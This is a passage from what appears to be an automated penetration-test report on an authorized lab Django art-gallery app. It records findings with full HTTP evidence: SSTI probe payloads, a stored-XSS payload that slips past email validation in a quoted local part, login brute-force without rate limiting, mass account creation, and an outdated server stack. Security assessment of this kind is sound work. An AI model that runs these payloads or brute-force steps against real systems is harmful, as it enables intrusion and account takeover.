Strong lead for server-side template injection. The DEBUG 404 page disclosed the Django project module name `ssti_debug_art_gallery` — "ssti" + "debug" almost certainly names the intended vulnerabilities. The user-controlled `name` field captured at registration (/accounts/register/step1, already a CONFIRMED stored-XSS sink there) is rendered server-side on the post-login preferences page as "Name: {value}" (currently shows the verbatim email). If that value is rendered through a template engine (e.g. render_template_string / django Template(name).render()), a payload such as {{7*7}} would be evaluated server-side — SSTI, which is RCE-class. Could not confirm from the preferences screen itself: it is read-only (the name is not editable here and the preferences POST ignores all submitted body fields, including name/premium — verified via differential probe), so the injection cannot originate on this screen. The preferences page is the RENDER/eval sink; confirmation requires injecting at the registration flow.

**Reproduction**

```
Register a new user via POST /accounts/register/step1/ with name set to an SSTI probe e.g. {{7*7}} (and ${7*7}/<%=7*7%> variants), complete the multi-step registration, then GET /accounts/preferences/ and inspect the rendered "Name:" value. Evaluation to "49" (instead of the literal "{{7*7}}") confirms SSTI; escalate with engine-specific RCE payloads.
```

**Evidence**

- Evidence `ev-mr0kuuy9-3h` — `artifacts/s-0005/ev-mr0kuuy9-3h/`

Request:

```http
GET /accounts/preferences/2/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 3587
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:42:45 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /accounts/preferences/2/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32804/accounts/preferences/2/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_debug_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
                register/step1/
                [name='register_step1']
            
          </li>
        
          <li>
            
                accounts/
                
            
                register/step2/
                [name='register_step2']
            
          </li>
        
          <li>
            
                accounts/
                
            
                register/step3/
                [name='register_step3']
            
          </li>
        
          <li>
            
                accounts/
                
            
                login/
                [name='login']
            
          </li>
        
          <li>
            
                accounts/
                
            
                home/
                [name='home']
            
          </li>
        
          <li>
            
                accounts/
                
            
                preferences/
                [name='preferences']
            
          </li>
        
          <li>
            
                accounts/
                
            
                logout/
                [name='logout']
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>accounts/preferences/2/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

<a id="finding-5"></a>

### 5. [SUSPECTED] [MEDIUM] [rate-limit] No rate limiting / brute-force protection on login endpoint

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

**Anomaly (why this is a lead):** 17 consecutive failed-login POSTs for username test@test.com (5 recon/SQLi + 12 rapid burst) from one session/IP were all accepted and processed (HTTP 200, login form re-rendered) with no HTTP 429, no account lockout, no CAPTCHA, no delay/backoff and no throttling at any point. The credential-verification endpoint applies no rate limiting, enabling unlimited online password brute-force against any known email (emails are enumerable via the registration flow). Cannot be expressed as a fail/pass negative-control pair (every attempt is an identical accepted 200), hence recorded as suspected.

POST /accounts/login/ enforces CSRF correctly but performs no rate limiting or lockout on repeated failed authentication attempts. 17 rapid failed attempts from a single IP/session were all served normally (200, form re-rendered) with no 429, lockout, CAPTCHA, or delay. Combined with the absence of MFA and enumerable account emails, this permits unlimited online credential brute-forcing leading to account takeover.

**Reproduction**

```
1. GET /accounts/login/ to obtain a csrftoken cookie + csrfmiddlewaretoken. 2. POST /accounts/login/ with valid csrfmiddlewaretoken, username=test@test.com, password=wrongNN, repeating 15-20+ times in rapid succession. 3. Observe every response is HTTP 200 returning the login form again (~2392 bytes) — no 429, no lockout banner, no CAPTCHA challenge, no increasing delay. Evidence: ev-mr0kkeah-2i, ev-mr0kkfqh-2j, ev-mr0kks34-2r, ev-mr0kkurz-2t (representative of the 12-request burst).
```

**Evidence**

- Evidence `ev-mr0kkurz-2t` — `artifacts/s-0003/ev-mr0kkurz-2t/`

Request:

```http
POST /accounts/login/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

csrfmiddlewaretoken=LfUmUbmR85aXnBio1Nf9jBbFbMvsgedQM9YMl0HFtTi0db5khnvZLRn35vrCAfU5&username=test@test.com&password=wrong12
```

Response:

```http
HTTP/1.1 200
content-length: 2392
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:34:58 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    

<nav class="navbar navbar-dark bg-dark">
    <a class="navbar-brand" href="#">Art Gallery</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
</nav>

<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h2 class="mb-4 text-center">Login</h2>
            <form method="post" class="needs-validation" novalidate>
                <input type="hidden" name="csrfmiddlewaretoken" value="jXgUkw8PYDhbiyqpevGnfEpGqpXFwC6SkRkkLltDjrpe88dlu5WdHUB4k8TPQDN7">
                <div class="form-group">
                    <label for="id_username">Email:</label>
                    <input type="text" name="username" value="test@test.com" autofocus autocapitalize="none" autocomplete="username" maxlength="150" required id="id_username">
                </div>
                <div class="form-group">
                    <label for="id_password">Password:</label>
                    <input type="password" name="password" autocomplete="current-password" required id="id_password">
                </div>
                <button type="submit" class="btn btn-primary btn-block">Login</button>
            </form>
        </div>
    </div>
</div>



    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

<a id="finding-6"></a>

### 6. [SUSPECTED] [MEDIUM] [xss-stored] Stored XSS lead: step2 EmailField accepts script payload via RFC quoted local part

- Screen: `s-0006`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

**Anomaly (why this is a lead):** Django's EmailField validation can be bypassed with an RFC quoted local part: POST email="<script>alert(1)</script>"@x.io was accepted (302→/accounts/register/step3/, ev-mr0l9h25-3x), persisting the script payload as the account's email — whereas a bare <script>...</script> is rejected (200, escaped re-render, ev-mr0l7ojc-3u). The app is proven to render stored profile fields unescaped (name stored-XSS + SSTI already confirmed at /accounts/preferences), so an unescaped email sink would execute. The email render sink was not located in the reachable user UI this run (preferences template renders only Name + Premium Subscriber; /admin 404s), so execution could not be confirmed — but this is a real stored-XSS lead pending an email-bearing render point (order/checkout confirmation, notification/email template, or an admin user view).

The step2 EmailField (param: email) rejects a plain <script> payload but accepts it when wrapped in an RFC 5321 quoted local part (e.g. "<script>alert(1)</script>"@x.io), storing the angle-bracket payload as the user's email. Because this same application renders stored profile fields without escaping (confirmed stored XSS/SSTI on the step1 name field at /accounts/preferences), the stored email payload would execute wherever the email is later rendered unescaped. No user-facing email render point was found in the mapped surface (preferences shows Name + Premium only; no Django admin), so this is recorded as a suspected lead rather than confirmed.

**Reproduction**

```
1) Complete registration step1 (name+password) to enter step2 state. 2) POST /accounts/register/step2/ with email="<script>alert(1)</script>"@x.io (URL-encoded), valid csrfmiddlewaretoken+csrftoken cookie → 302 redirect to /accounts/register/step3/ (payload accepted/stored; ev-mr0l9h25-3x). Control: POST email=<script>alert(1)</script> (unquoted) → 200, EmailField rejects it and the re-rendered value is HTML-escaped (ev-mr0l7ojc-3u). 3) To confirm, complete step3 and view the account's email at any unescaped render point (order/confirmation/admin view) — not located in the currently mapped surface.
```

**Evidence**

- Evidence `ev-mr0l9h25-3x` — `artifacts/s-0006/ev-mr0l9h25-3x/`

Request:

```http
POST /accounts/register/step2/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

csrfmiddlewaretoken=gnZyVb1gvudH3FMOGvSGwYaxI20zw143a91paJ9oDvhp4k9ROt6oyPgk7fpMsZp3&email=%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%40x.io
```

Response:

```http
HTTP/1.1 302
content-length: 0
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:54:07 GMT
location: /accounts/register/step3/
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY
```

<a id="finding-7"></a>

### 7. [SUSPECTED] [MEDIUM] [vulnerable-component] Outdated & EOL CPython 3.9.2 — CVE-2023-24329 / CVE-2024-6923 / CVE-2022-45061

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

**Anomaly (why this is a lead):** CPython 3.9.2 detected via the Server response header (`WSGIServer/0.2 CPython/3.9.2`). Python 3.9.2 was released Feb 2021; the 3.9 series reached end-of-life for security support in Oct 2025, so it now receives no further fixes, and 3.9.2 is missing ~5 years of intervening 3.9.x stdlib security patches. Notable applicable CVEs: CVE-2023-24329 (urllib.parse blank-char blocklist bypass → SSRF/host-filter bypass, fixed 3.9.17), CVE-2024-6923 (email module header injection, fixed 3.9.20), CVE-2022-45061 (IDNA quadratic-complexity CPU DoS, fixed 3.9.16). Version-based match from the banner — not exploited.

The runtime advertises CPython 3.9.2 in the Server header. Python 3.9 is end-of-life (security support ended 2025-10) and 3.9.2 predates many security fixes in the 3.9 line. Confidently-applicable issues for this version: CVE-2023-24329 (High — urllib.parse fails to reject URLs with leading control/whitespace, bypassing blocklist-based SSRF/host validation; fixed in 3.9.17), CVE-2024-6923 (email.message header injection via embedded newlines; fixed in 3.9.20), CVE-2022-45061 (DoS via quadratic IDNA decoding; fixed in 3.9.16), plus CVE-2023-40217 (ssl pre-handshake data injection, fixed 3.9.18) and CVE-2024-6232 (tarfile ReDoS, fixed 3.9.20). None are direct interpreter RCE, hence medium; the SSRF-filter-bypass (CVE-2023-24329) is the most exploitable class but depends on the app using urllib blocklisting. Remediation: upgrade to a supported Python (3.12/3.13). This is a version-based component lead, not an actively confirmed exploit.

[+] Also observed as "Django development server (WSGIServer/0.2 runserver) exposed in production".

**Reproduction**

```
curl -sI http://target.local:32804/ → response header `Server: WSGIServer/0.2 CPython/3.9.2`. Cross-reference 3.9.2 against the Python 3.9 changelog / EOL schedule: 3.9 security support ended 2025-10; CVE-2023-24329 fixed in 3.9.17, CVE-2024-6923 in 3.9.20, CVE-2022-45061 in 3.9.16 — all post-date 3.9.2.
```

**Evidence**

- Evidence `ev-mr0m38ka-5l` — `artifacts/_/ev-mr0m38ka-5l/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 5481
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 12:17:15 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Art Gallery</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse" id="navbarsExample01">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
            <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
            </li>
            
            <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</a>
            <div class="dropdown-menu" aria-labelledby="dropdown01">
                <a class="dropdown-item" href="/accounts/preferences">My settings</a>
                <a class="dropdown-item disabled" href="#">Buy Art(temporary disabled)</a>
                <a class="dropdown-item disabled" href="#">Sell Art(Only Premiun Accounts)</a>
                <a class="dropdown-item" href="/accounts/logout">Logout</a>
            </div>
            </li>
            
        </ul>
        <form class="form-inline my-2 my-md-0">
            <input class="form-control" type="text" placeholder="Search" aria-label="Search">
        </form>
        </div>
    </nav>
    
    <div class="container">
        
        <h3 class="my-4 text-center">Welcome, test!</h2>
        
        <h4 class="my-4 text-center">Art objects</h1>
        <div class="gallery">
            
                <div class="gallery-item">
                    <img src="/static/img/r1.jpg" alt="DSC02674_11">
                    <h2>DSC02674_11</h2>
                    <p>Computer Abstract Art Image<br>
                        Price: <b>$ 8.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r2.jpg" alt="Urban street-art">
                    <h2>Urban street-art</h2>
                    <p>graffiti on a wooden construction-wall on Plantage Muidergracht<br>
                        Price: <b>$ 5.6</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r3.jpg" alt="Abstract-9974">
                    <h2>Abstract-9974</h2>
                    <p>Abstract Art Image<br>
                        Price: <b>$ 6.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r4.jpg" alt="Art 235">
                    <h2>Art 235</h2>
                    <p>Composite Image<br>
                        Price: <b>$ 4.8</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r5.jpg" alt="Radiographic Image">
                    <h2>Radiographic Image</h2>
                    <p>African Songye Power Figure in the collection of the Indianapolis Museum of Art<br>
                        Price: <b>$ 11.3</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r6.jpg" alt="Abstract00BO">
                    <h2>Abstract00BO</h2>
                    <p>BTerryCompton Abstract Art Image<br>
                        Price: <b>$ 8.4</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r7.jpg" alt="Aliens laughing">
                    <h2>Aliens laughing</h2>
                    <p>Young gray aliens reading books, laughing<br>
                        Price: <b>$ 6.5</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r8.jpg" alt="Flower #56">
                    <h2>Flower #56</h2>
                    <p>134 flowers Sea Lavender Art<br>
                        Price: <b>$ 9.0</b></p>
                </div>
            
                <div class="gallery-item">
                    <img src="/static/img/r9.jpg" alt="White Wolves">
                    <h2>White Wolves</h2>
                    <p>CPM Art Challenge Photo White Wolves, 2013<br>
                        Price: <b>$ 7.3</b></p>
                </div>
            
        </div>
    </div>


    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr0m4r9d-5t` — `artifacts/_/ev-mr0m4r9d-5t/`

Request:

```http
GET /admin/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 2347
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 12:18:26 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /admin/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32804/admin/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_debug_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>admin/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

<a id="finding-8"></a>

### 8. [SUSPECTED] [MEDIUM] [vulnerable-component] Django development server (runserver / wsgiref) used in production

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

**Anomaly (why this is a lead):** Server header `WSGIServer/0.2 CPython/3.9.2` is the signature of Python's wsgiref simple_server — Django's `manage.py runserver` dev server — and it serves `/static/admin/css/base.css` directly (200). Django docs explicitly forbid this for production ("not gone through security audits or performance tests"): single-threaded/blocking (trivially DoS-able), no hardening. Corroborated by the DEBUG=True technical 404 page (project module `ssti_debug_art_gallery`, URLconf disclosed). Insecure-by-design component running as the production server — deployment-based observation, not a single exploited request.

Distinct from the outdated-interpreter issue (f-008): here the *component choice* is the weakness. The app is fronted by Django's built-in development server (wsgiref `WSGIServer/0.2`) rather than a hardened WSGI/ASGI stack (gunicorn/uWSGI + nginx). The dev server is unsupported for production by the Django project — no security review, single-threaded (a few slow/concurrent requests stall it → DoS), and it is paired here with DEBUG=True (the Django 404 debug page leaks the URLconf and project module; a 500 would expose full tracebacks, settings, and potentially SECRET_KEY). Remediation: run a production WSGI/ASGI server with DEBUG=False and explicit ALLOWED_HOSTS, and serve static via the web server/CDN. The DEBUG info-disclosure may already be captured in per-screen diagnosis; this is the component/deployment lead for A06.

**Reproduction**

```
1) curl -sI http://target.local:32804/ → `Server: WSGIServer/0.2 CPython/3.9.2` (wsgiref = Django runserver). 2) GET /static/admin/css/base.css → 200 (runserver serving static). 3) GET /admin/ → Django DEBUG=True "Page not found (404)" page disclosing the URLconf and project module `ssti_debug_art_gallery`.
```

**Evidence**

- Evidence `ev-mr0m4r9d-5t` — `artifacts/_/ev-mr0m4r9d-5t/`

Request:

```http
GET /admin/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 2347
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 12:18:26 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /admin/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32804/admin/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_debug_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>admin/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

<a id="finding-9"></a>

### 9. [SUSPECTED] [LOW] [rate-limit] No rate limiting / anti-automation on multi-step registration (mass account creation)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

**Anomaly (why this is a lead):** 6 consecutive registration POSTs (plus ~5 earlier full registrations) all succeeded with HTTP 302 and zero throttling, CAPTCHA, or lockout — the registration endpoint has no anti-automation, enabling automated mass account creation.

The registration flow (/accounts/register/step1 → step2 → step3) enforces no rate limiting, CAPTCHA, or lockout. A burst of 6 back-to-back POSTs to step1 all returned 302 success (plus numerous additional full registrations completed during this assessment), with no 429, no challenge, and no slowdown. This permits automated mass account creation / resource exhaustion and amplifies any downstream abuse (e.g. seeding many accounts carrying the stored-XSS display-name payload). Recorded as suspected because the class cannot be expressed with the confirmed evidence structure (a rate-limit weakness has no failing negative control — every request succeeds); the observation itself is directly demonstrated.

**Reproduction**

```
Send N rapid POSTs to /accounts/register/step1/ (valid csrfmiddlewaretoken + csrftoken cookie, name+password). All return 302 → step2 with no throttling, CAPTCHA, or lockout. Observed 6 consecutive successes in ~10s (ev-mr0keiih-21 … ev-mr0keq0j-26) on top of ~5 prior full registrations.
```

**Evidence**

- Evidence `ev-mr0keq0j-26` — `artifacts/s-0002/ev-mr0keq0j-26/`

Request:

```http
POST /accounts/register/step1/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

csrfmiddlewaretoken=XcJmvw9hY46ySs4dO5aX41o3Irr6muvVY6NMWlu5jSeBI2R94FqNwhArCangGvca&name=RL_burst_6&password=TestPass123!
```

Response:

```http
HTTP/1.1 302
content-length: 0
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:30:12 GMT
location: /accounts/register/step2/
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY
```
